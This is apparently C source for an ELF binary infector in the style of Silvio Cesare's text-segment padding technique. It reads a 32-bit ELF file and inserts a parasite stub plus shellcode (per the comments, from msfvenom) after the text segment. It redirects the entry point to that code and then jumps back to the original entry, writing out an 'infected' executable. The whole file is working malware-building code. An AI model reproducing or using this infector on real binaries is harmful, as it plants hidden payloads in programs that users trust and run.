#define PAGE_SIZE 4096
#define PARASITE_SIZE 41


#include <elf.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>

//used for memcpy
#include <string.h>

//This struct is used by the function get_shellcode since we need to 
//return two values from the fucntion
typedef struct shellcode_struct{
	int size;
	char * data;
} shellcode_struct;


Elf32_Ehdr * get_elf_header(FILE * fp);
Elf32_Phdr ** get_elf_program_headers(FILE * fp, Elf32_Ehdr * elf_header);
Elf32_Shdr ** get_elf_section_headers(FILE * fp, Elf32_Ehdr * elf_header);
char * get_parasite();
shellcode_struct * get_shellcode(char * argv[]);

void copy_partial(int fd, int od, unsigned int len);

void print_val(char *  name,int val);
void print_char_val(char * name, unsigned char * val);
void print_elf_headers(Elf32_Ehdr * ehdr);
void print_program_headers(Elf32_Ehdr * ehdr, Elf32_Phdr ** phdrs);
void print_section_headers(Elf32_Ehdr * ehdr, Elf32_Shdr ** shdrs);
void fprint_val(FILE * fp,char *  name,int val);
void fprint_char_val(FILE * fp,char * name, unsigned char * val);
void fprint_elf_headers(FILE * fp,Elf32_Ehdr * ehdr);
void fprint_program_headers(FILE * fp,Elf32_Ehdr * ehdr, Elf32_Phdr ** phdrs);
void fprint_section_headers(FILE * fp,Elf32_Ehdr * ehdr, Elf32_Shdr ** shdrs);
void fprint_all_headers(char * fname, Elf32_Ehdr * ehdr, Elf32_Phdr ** phdrs, Elf32_Shdr ** shdrs);

int main(int argc, char * argv[]){
	FILE * fp;
	FILE * shellcode_file;

	Elf32_Ehdr * elf_header;
	Elf32_Phdr ** program_headers;
	Elf32_Shdr ** section_headers;
	shellcode_struct * shellcode;
	char * parasite;
	
	int text_segment_index;
	unsigned int new_code_address;

	struct stat stat;


  puts("[Info] Opening file to inject...");
	//open file to be injected for manipulation
	if((fp = fopen(argv[1],"r")) == NULL)
		goto file_to_inject_open_error;	
	
  puts("[Info] Getting ELF header from file...");
	//get our elf header
	if((elf_header = get_elf_header(fp)) == NULL)
		goto error;
	
  puts("[Info] Parsing program headers...");
	//get elf program headers
	program_headers = get_elf_program_headers(fp, elf_header);
	
  puts("[Info] Parsing section headers...");
	//get elf section headers
	section_headers = get_elf_section_headers(fp, elf_header);

  puts("[Info] Getting shellcode...");
	shellcode = get_shellcode(argv);

  fprint_all_headers("headers.orig.debug",elf_header,program_headers,section_headers);

	//In ELF header, increase e_shoff by PAGE_SIZE 
  puts("[Info][01] Increasing e_shoff by PAGE_SIZE in ELF header...");
  int segment_size_increase = PAGE_SIZE;
  printf("[Info] header e_shoff changed from %x to ",elf_header->e_shoff);
  int original_e_shoff = elf_header->e_shoff;
	elf_header->e_shoff = elf_header->e_shoff + segment_size_increase;
  printf("%x\n",elf_header->e_shoff);

  if(original_e_shoff == elf_header->e_shoff){
    puts("[Warning] Preserved e_shoff matches increased e_shoff value!");
  }
		
	//patch code to be inserted to jump to original entry point
	//from the elf header.		
  puts("[Info][02] Patching parasite to jump to the original entry point...");
	parasite = get_parasite();
  printf("[Info] writing entry point %x to parasite.\n",elf_header->e_entry);
	memcpy(&parasite[32],&elf_header->e_entry, 4);	
	
	//Locate the text segment program header	
  puts("[Info][03] Locating the text segment program header...");
  int flag_x = 4;
	for(int i=0; i < elf_header->e_phnum; i++){
		if(program_headers[i]->p_type == 1 && program_headers[i]->p_flags & flag_x != 0){
      printf("[Info] using text segment at index %d.\n",i);
			text_segment_index = i;
			break;
		}
	}

  int parasite_length = PARASITE_SIZE + shellcode->size;
	new_code_address = program_headers[text_segment_index]->p_vaddr + program_headers[text_segment_index]->p_filesz;	
  int pad_length = segment_size_increase - (new_code_address & (segment_size_increase - 1));
  int phdrs_length = elf_header->e_phentsize * elf_header->e_phnum;

  print_val("parasite_length",parasite_length);
  print_val("new_code_address",new_code_address);
  print_val("pad_length",pad_length);

  if(pad_length < parasite_length){
    puts("Error: Parasite too large!");
    exit(1);
  } 

	//Modify e_entry, in the elf header, to point to new code.
  puts("[Info][03][a] Modifying entry point of ELF header to point to new code...");
  printf("[Info] elf header entry point changed from %x to ",elf_header->e_entry);
	elf_header->e_entry = new_code_address;
  printf("%x.\n",elf_header->e_entry);
	
	
	
	//we need the filesz for offset
	//int offset=program_headers[text_segment_index]->p_offset+program_headers[text_segment_index]->p_filesz;
  //This is the offset from the beginning of the file where the parasite will be injected.
  int parasite_injection_offset = program_headers[text_segment_index]->p_offset + program_headers[text_segment_index]->p_filesz;
	
	int original_offset=program_headers[text_segment_index]->p_offset+program_headers[text_segment_index]->p_filesz;
	int new_offset=program_headers[text_segment_index]->p_offset+program_headers[text_segment_index]->p_filesz + PAGE_SIZE;

	//increase p_filesz to account for new code
  puts("[Info][03][b] Increasing p_filesz by size of new code...");
  printf("[Info] program header filesz changed from %x to ",program_headers[text_segment_index]->p_filesz);
	unsigned int new_p_filesz = program_headers[text_segment_index]->p_filesz + parasite_length;
	program_headers[text_segment_index]->p_filesz = new_p_filesz;
  printf("%x.\n",program_headers[text_segment_index]->p_filesz);
	
	//increase p_memsz to account for new code
  puts("[Info][03][c] Increasing p_memsz by size of new code...");
  printf("[Info] program header memsz changed from %x to ",program_headers[text_segment_index]->p_memsz);
	unsigned int new_p_memsz = program_headers[text_segment_index]->p_memsz + parasite_length;
	program_headers[text_segment_index]->p_memsz = new_p_memsz;
	printf("%x.\n",program_headers[text_segment_index]->p_memsz);

	//For each phdr who's segment is after the insertion -- increase p_offset
	//by PAGE_SIZE ???
	
	//printf("The offset is 0x%x (%d)\n", offset,offset);
  puts("[Info][04] For each Phdr who's segment is after the parasite insertion...");
	for(int i=(text_segment_index+1); i<elf_header->e_phnum; i++){
    //if the program headers come after the section in which the insertion took place...
    if(program_headers[i]->p_offset > parasite_injection_offset){
      //then they need to have their addressed changed to reflect the shift
      puts("[Info][04][a] Increasing p_offset by increased PAGE_SIZE...");
      printf("[Info] program_header[%d] offset changed from %x to ",i,program_headers[i]->p_offset);
		  program_headers[i]->p_offset += segment_size_increase;
      printf("%x.\n",program_headers[i]->p_offset);
    }
	}
	
	//debug code
	
	/*for(int i=0; i<elf_header->e_shnum;i++){
		printf("The old section header size for %d is %x\n",i,section_headers[i]->sh_offset);
	}*/
	//end debug code
	
	//For each pphdr who's segment is after the insertion -- increase p_offset
	//by PAGE_SIZE ???
  puts("[Info][06] For each Shdr who's section is after the insertion...");
	for(int i=0;i<elf_header->e_shnum; i++){
		if(section_headers[i]->sh_offset >= parasite_injection_offset){
      puts("[Info][06][a] Increasing sh_offset by PAGE_SIZE...");
      printf("[Info] section header[%d] changed from %x to ",i,section_headers[i]->sh_offset);
			section_headers[i]->sh_offset += segment_size_increase;
      printf("%x.\n",section_headers[i]->sh_offset);
		}
    else if(section_headers[i]->sh_addr + section_headers[i]->sh_size == new_code_address){
     puts("[Info][05] Increasing sh_len by the parasite length for the last Shdr in the text segment..."); 
     section_headers[i]->sh_size += parasite_length;
    }
    else{
    }
    //printf("[Debug] sh_addr = %x, sh_size = %x, new_code = %x.\n",section_headers[i]->sh_addr,section_headers[i]->sh_size,new_code_address);
	}
	
	//debug code
	/*for(int i=0; i<elf_header->e_shnum;i++){
		printf("The new section header size for %d is %x\n",i,section_headers[i]->sh_offset);
	}*/
	//end debug code

  fprint_all_headers("headers.new.debug",elf_header,program_headers,section_headers);

/*
*Time to inject the shellcode into the file!!!
*
*/
	//create file to write to	
	FILE * infected;
	infected = fopen("infected","w");
	
	//write the elf header file
	fwrite(elf_header,elf_header->e_ehsize,1,infected);
	
	//write the program headers
	for(int i=0; i<elf_header->e_phnum; i++){
    printf("[Info] writing program header[%d] (size %d). \n",i,elf_header->e_phentsize);
		fwrite(program_headers[i],elf_header->e_phentsize,1,infected);
	}
	//copy everything up to where we insert the shellcode	
	int position;
	int fd = fileno(fp);
	int infected_descriptor = fileno(infected);
	
	//messy effect of switching from file pointers to file descriptors. Flush or what we have written so 
	//far with fwrite or won't show up. (The data is still buffered write)
	fflush(fp);
	fflush(infected);
	
	//lseek(infected_descriptor, position=elf_header->e_ehsize+(elf_header->e_phentsize*elf_header->e_phnum), SEEK_SET);
	//lseek(infected_descriptor, 0, SEEK_END);
	lseek(fd, position=elf_header->e_ehsize+(elf_header->e_phentsize*elf_header->e_phnum), SEEK_SET);
	//lseek(fd, position=elf_header->e_ehsize + padding_length, SEEK_SET);
	lseek(infected_descriptor, position, SEEK_SET);

  //Debug; The latter value is what the wit-virus paper used as lseek pos.
  /*if(position != (elf_header->e_ehsize + padding_length)){
    puts("[Warning] Lseek position may be incorrect!");
  }*/
  print_val("sizeof(elf_header)",sizeof(elf_header));
  print_val("elf_header->e_ehsize",elf_header->e_ehsize);
  print_val("current lseek position",position);
  print_val("parasite_injection_offset",parasite_injection_offset);

  printf("[Info] copying headers to new file...\n");
	//printf("-- offset is:%d\n",offset);
	//printf("-- position is %d\n",position);
	//printf("-- offset-position is:%d (0x%x)\n",offset-position,offset-position);
  //printf("-- prog_header[]->p_offset + offset - position is: %d\n",(program_headers[text_segment_index]->p_offset + offset) - position);
	//copy_partial(fd, infected_descriptor, (program_headers[text_segment_index]->p_offset + parasite_injection_offset)-position);
	//copy_partial(fd, infected_descriptor, (original_offset-position));
	copy_partial(fd, infected_descriptor, parasite_injection_offset-position);
	
	//insert the shellcode
  puts("[Info] Writing parasite to file...");
	write(infected_descriptor,parasite,PARASITE_SIZE);
  puts("[Info] Writing shellcode to file...");
	write(infected_descriptor,shellcode->data,shellcode->size);
	
	//calculate the amount of garbage we have to insert into the file
  puts("[Info] Generating garbage bytes...");
  print_val("segment_size_increase",segment_size_increase);
  print_val("parasite_length",parasite_length);
	int garbage_size = segment_size_increase-(parasite_length);
	char * garbage = (char *) malloc(garbage_size);
	
	//printf("The garbage size is %d\n",garbage_size);
  print_val("garbage_size",garbage_size);

	//Use garbage character 0x42 because life the universe and everything.
	for(int i=0;i<garbage_size;i++){
		garbage[i] = 144; //144 = 0x90, because NOPs.  
	}
	

	//write the garbage to the file
  puts("[Info] Writing garbage to file...");
	if(write(infected_descriptor, garbage, garbage_size) < 0){
    puts("[Error] Something went wrong while writing garbage to file!");
  }
	
	position += garbage_size;

	//write everything up to section header to file
  print_val("position",position);
  print_val("parasite_injection_offset",parasite_injection_offset);
	print_val("elf_header->e_shoff",elf_header->e_shoff);
  print_val("original_e_shoff",original_e_shoff);
  //copy_partial(fd, infected_descriptor, elf_header->e_shoff-position);
	//copy_partial(fd, infected_descriptor, elf_header->e_shoff-parasite_injection_offset);
	copy_partial(fd, infected_descriptor, original_e_shoff-parasite_injection_offset);

	//write the section headers to the file
	for(int i=0;i<elf_header->e_shnum; i++){
		int written = write(infected_descriptor, section_headers[i], elf_header->e_shentsize);
    if(written == -1){
      puts("[Error] Something went wrong while writing section headers!");
    }
    else if(written != elf_header->e_shentsize){
      printf("[Error] Number of written bytes %d not equal to section header size %d!\n",written,elf_header->e_shentsize);
    }
    else{
      printf("[Info] Section header %d written.\n",i);
    }
	}
	
  print_val("old lseek pos: position+(e_shentsize * e_shnum)",position+(elf_header->e_shentsize * elf_header->e_shnum));
  print_val("new lseek pos: original_e_shoff + (e_shentsize * e_shnum)",original_e_shoff + (elf_header->e_shentsize * elf_header->e_shnum));
	//if(lseek(fd, position+(elf_header->e_shentsize*elf_header->e_shnum),SEEK_SET)<0){
	int saved_seek;
  if(saved_seek = lseek(fd, position = original_e_shoff + (elf_header->e_shentsize * elf_header->e_shnum),SEEK_SET)<0){
		puts("[Error] lseek error!");
	}
  print_val("position",position);
	
	//int old_fd = fd;
  int fd_filesize = lseek(fd,0,SEEK_END);
  print_val("filesize",fd_filesize);

  lseek(fd,saved_seek,SEEK_SET); //Reposition to the previous seek
  lseek(infected_descriptor,0,SEEK_END);

	//write everything to end of file	
  puts("[Info] Writing remaining data to file...");
	copy_partial(fd, infected_descriptor, fd_filesize-position);
	
  puts("[Info] Done.");
	return 0;
	




//If something goes wrong handle it here 
file_to_inject_open_error:
	puts("Failed to open file to inject");
	return -1;
error:
	puts("Program has been terminated");
	return -1;
}

/*
 *Responsible for returning a pointer to an elf struct to us.
 *For the sake of simplicity we will assume that the header is 52 bytes. 
 */
Elf32_Ehdr * get_elf_header(FILE * fp){
	Elf32_Ehdr * elf = (Elf32_Ehdr *) malloc(sizeof(Elf32_Ehdr));
	
	//read in the entire header at once.
	if(fread(elf,1,52,fp) == 0)
		goto elf_header_error;
	return elf;

elf_header_error:
	puts("Failed to read elf header -- are you sure this is an elf?");
	return NULL;	
}


/*
 *Returns an array of ELF program headers. Since it is a double pointer,
 *we can cycle through the program headers as an array.
 */

Elf32_Phdr ** get_elf_program_headers(FILE * fp, Elf32_Ehdr * elf_header){
	
	//Create an array of program headers using malloc
	Elf32_Phdr ** elf_header_list = (Elf32_Phdr **) malloc(sizeof(Elf32_Phdr *) * elf_header->e_phnum);
	
	//allocate memory for each individual program header.
	for(int i = 0; i<elf_header->e_phnum; i++){
		elf_header_list[i] = (Elf32_Phdr *) malloc(elf_header->e_phentsize);
	}
	
	//Jump to start of program header table
	fseek(fp, elf_header->e_phoff, SEEK_SET);

	//copy the data from our elf into the allocated memory.
	for(int i = 0; i< elf_header->e_phnum; i++){
		fread(elf_header_list[i], 1, elf_header->e_phentsize,fp);
	}
	
	return elf_header_list;

}

Elf32_Shdr ** get_elf_section_headers(FILE * fp, Elf32_Ehdr * elf_header){
	
	//Create an array of section headers using malloc
	Elf32_Shdr ** elf_section_header_list = (Elf32_Shdr **) malloc(sizeof(Elf32_Shdr *) * elf_header->e_shnum);
	
	//allocate memory for each individual section header.
	for(int i = 0; i<elf_header->e_shnum; i++){
		elf_section_header_list[i] = (Elf32_Shdr *) malloc(elf_header->e_shentsize);
	}
	
	//Jump to start of program header table
	fseek(fp, elf_header->e_shoff, SEEK_SET);

	//copy the data from our elf into the allocated memory.
	for(int i = 0; i< elf_header->e_phnum; i++){
		fread(elf_section_header_list[i], 1, elf_header->e_shentsize,fp);
	}
	
	return elf_section_header_list;

}

/*
 *Read parasite from file and store it in memory. Returns a character pointer
 *since we will be working with individual bytes
 */

char * get_parasite(){
	FILE * parasite_file;
	
	char * parasite = (char *) malloc(PARASITE_SIZE);
	if((parasite_file = fopen("parasite.raw","r"))==NULL){
		puts("parasite file not found!");
		exit(1);
	}
		
	
	if(fread(parasite, 1, PARASITE_SIZE, parasite_file) == 0){
		puts("woops failed to read parasite.raw Are you sure this is the right file?");
		exit(1);
	}

	fclose(parasite_file);
	return parasite;
	
}

/*
 *Read the shellcode we want to insert from msfvenom into memory and 
 *return struct that contatins both its size and the data.
 */

shellcode_struct * get_shellcode(char * argv[]){
	FILE * shellcode_file;
	int shellcode_size;
	shellcode_struct * shellcode;


	shellcode = (shellcode_struct *) malloc(sizeof(shellcode_struct));

	if((shellcode_file = fopen(argv[2],"r"))==NULL){
		puts("Shellcode file not found.");
		exit(1);
	}
	
	fseek(shellcode_file, 0L, SEEK_END);
	shellcode_size = ftell(shellcode_file);
	fseek(shellcode_file, 0L, SEEK_SET);
	
	shellcode->data = (char *) malloc(shellcode_size);
	shellcode->size = shellcode_size;
	
	
	if(fread(shellcode->data, 1, shellcode_size, shellcode_file) == 0){
		puts("Failed to copy shellcode from file.");
	}

	return shellcode;
}

/*
 *This code is based off of silvio's for copying partial data
 *
 */

void copy_partial(int fd, int od, unsigned int len){
	char idata[PAGE_SIZE];
	unsigned int n=0;
	int r;

	while(n+PAGE_SIZE<len){
		if(read(fd,idata,PAGE_SIZE) != PAGE_SIZE){
			puts("read");
			exit(1);
		}

		if(write(od, idata, PAGE_SIZE)<0){
			puts("write");
			exit(1);
		}
		
		n+=PAGE_SIZE;
	}

	r=read(fd,idata,len-n);
	if(r<0){
		puts("read");
		exit(1);
	}
	
	if(write(od,idata,r)<0){
		puts("write");
		exit(1);
	}

	
}

void print_val(char *  name, int val){
  printf("[Debug] %s = %d (0x%x)\n",name,val,val);
}
void print_char_val(char * name, unsigned char * val){
  printf("[Debug] %s = %s\n",name,val);
}

void print_elf_headers(Elf32_Ehdr * ehdr){
  print_char_val("e_ident",ehdr->e_ident);
  print_val("e_type",ehdr->e_type);
  print_val("e_machine",ehdr->e_machine);
  print_val("e_version",ehdr->e_version);
  print_val("e_entry",ehdr->e_entry);
  print_val("e_phoff",ehdr->e_phoff);
  print_val("e_shoff",ehdr->e_shoff);
  print_val("e_flags",ehdr->e_flags);
  print_val("e_ehsize",ehdr->e_ehsize);
  print_val("e_phentsize",ehdr->e_phentsize);
  print_val("e_phnum",ehdr->e_phnum);
  print_val("e_shentsize",ehdr->e_shentsize);
  print_val("e_shnum",ehdr->e_shnum);
  print_val("e_shstrndx",ehdr->e_shstrndx);
}
void print_program_headers(Elf32_Ehdr * ehdr, Elf32_Phdr ** phdrs){
  for(int i=0;i<ehdr->e_phnum;i+=1){
    printf("\n------ program header[%d] ------\n",i);
    print_val("p_type",phdrs[i]->p_type);
    print_val("p_offset",phdrs[i]->p_offset);
    print_val("p_vaddr",phdrs[i]->p_vaddr);
    print_val("p_paddr",phdrs[i]->p_paddr);
    print_val("p_filesz",phdrs[i]->p_filesz);
    print_val("p_memsz",phdrs[i]->p_memsz);
    print_val("p_flags",phdrs[i]->p_flags);
    print_val("p_align",phdrs[i]->p_align);
  }
  puts("");
}
void print_section_headers(Elf32_Ehdr * ehdr, Elf32_Shdr ** shdrs){
  for(int i=0;i<ehdr->e_shnum;i+=1){
    printf("\n------ section header[%d] ------\n",i);
    print_val("sh_name",shdrs[i]->sh_name);
    print_val("sh_type",shdrs[i]->sh_type);
    print_val("sh_flags",shdrs[i]->sh_flags);
    print_val("sh_addr",shdrs[i]->sh_addr);
    print_val("sh_offset",shdrs[i]->sh_offset);
    print_val("sh_size",shdrs[i]->sh_size);
    print_val("sh_link",shdrs[i]->sh_link);
    print_val("sh_info",shdrs[i]->sh_info);
    print_val("sh_addralign",shdrs[i]->sh_addralign);
    print_val("sh_entsize",shdrs[i]->sh_entsize);
  }
  puts("");
}


void fprint_val(FILE * fp,char *  name, int val){
  fprintf(fp,"%s = %d (0x%x)\n",name,val,val);
}
void fprint_char_val(FILE * fp,char * name, unsigned char * val){
  fprintf(fp,"%s = %s\n",name,val);
}

void fprint_elf_headers(FILE * fp,Elf32_Ehdr * ehdr){
  fprint_char_val(fp,"e_ident",ehdr->e_ident);
  fprint_val(fp,"e_type",ehdr->e_type);
  fprint_val(fp,"e_machine",ehdr->e_machine);
  fprint_val(fp,"e_version",ehdr->e_version);
  fprint_val(fp,"e_entry",ehdr->e_entry);
  fprint_val(fp,"e_phoff",ehdr->e_phoff);
  fprint_val(fp,"e_shoff",ehdr->e_shoff);
  fprint_val(fp,"e_flags",ehdr->e_flags);
  fprint_val(fp,"e_ehsize",ehdr->e_ehsize);
  fprint_val(fp,"e_phentsize",ehdr->e_phentsize);
  fprint_val(fp,"e_phnum",ehdr->e_phnum);
  fprint_val(fp,"e_shentsize",ehdr->e_shentsize);
  fprint_val(fp,"e_shnum",ehdr->e_shnum);
  fprint_val(fp,"e_shstrndx",ehdr->e_shstrndx);
}
void fprint_program_headers(FILE * fp,Elf32_Ehdr * ehdr, Elf32_Phdr ** phdrs){
  for(int i=0;i<ehdr->e_phnum;i+=1){
    fprintf(fp,"\n------ program header[%d] ------\n",i);
    fprint_val(fp,"p_type",phdrs[i]->p_type);
    fprint_val(fp,"p_offset",phdrs[i]->p_offset);
    fprint_val(fp,"p_vaddr",phdrs[i]->p_vaddr);
    fprint_val(fp,"p_paddr",phdrs[i]->p_paddr);
    fprint_val(fp,"p_filesz",phdrs[i]->p_filesz);
    fprint_val(fp,"p_memsz",phdrs[i]->p_memsz);
    fprint_val(fp,"p_flags",phdrs[i]->p_flags);
    fprint_val(fp,"p_align",phdrs[i]->p_align);
  }
  fprintf(fp,"\n");
}
void fprint_section_headers(FILE * fp,Elf32_Ehdr * ehdr, Elf32_Shdr ** shdrs){
  for(int i=0;i<ehdr->e_shnum;i+=1){
    fprintf(fp,"\n------ section header[%d] ------\n",i);
    fprint_val(fp,"sh_name",shdrs[i]->sh_name);
    fprint_val(fp,"sh_type",shdrs[i]->sh_type);
    fprint_val(fp,"sh_flags",shdrs[i]->sh_flags);
    fprint_val(fp,"sh_addr",shdrs[i]->sh_addr);
    fprint_val(fp,"sh_offset",shdrs[i]->sh_offset);
    fprint_val(fp,"sh_size",shdrs[i]->sh_size);
    fprint_val(fp,"sh_link",shdrs[i]->sh_link);
    fprint_val(fp,"sh_info",shdrs[i]->sh_info);
    fprint_val(fp,"sh_addralign",shdrs[i]->sh_addralign);
    fprint_val(fp,"sh_entsize",shdrs[i]->sh_entsize);
  }
  fprintf(fp,"\n");
}
void fprint_all_headers(char * fname, Elf32_Ehdr * ehdr, Elf32_Phdr ** phdrs, Elf32_Shdr ** shdrs){
  FILE * fp = fopen(fname,"w");
  if(fp == NULL){
    printf("Error opening file, \"%s\"!",fname);
    return;
  }

  fprint_elf_headers(fp,ehdr);
  fprint_program_headers(fp,ehdr,phdrs);
  fprint_section_headers(fp,ehdr,shdrs);
}
